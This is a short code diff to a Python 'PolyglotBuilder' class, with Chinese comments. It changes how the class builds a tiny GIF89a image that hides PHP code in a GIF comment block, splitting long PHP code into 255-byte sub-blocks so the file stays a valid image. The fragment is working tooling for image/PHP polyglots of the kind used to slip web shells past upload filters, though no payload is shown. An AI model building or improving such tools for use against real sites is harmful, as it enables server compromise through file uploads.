@@ -214,9 +214,15 @@ class PolyglotBuilder:
         # 极小的GIF89a + PHP代码
         micro_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00'
         php_bytes = php_code.encode('utf-8')
-        
-        # 注释块嵌入代码
-        comment = b'\x21\xFE' + bytes([len(php_bytes)]) + php_bytes + b'\x00'
+
+        # 注释块嵌入代码（GIF 子块单块上限 255 字节，超长需分块，与 create_gif_comment_php 一致）
+        comment = b'\x21\xFE'
+        offset = 0
+        while offset < len(php_bytes):
+            chunk = php_bytes[offset:offset+255]
+            comment += bytes([len(chunk)]) + chunk
+            offset += 255
+        comment += b'\x00'  # 块结束符
         
         # 最小图像数据
         image = b'\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00'
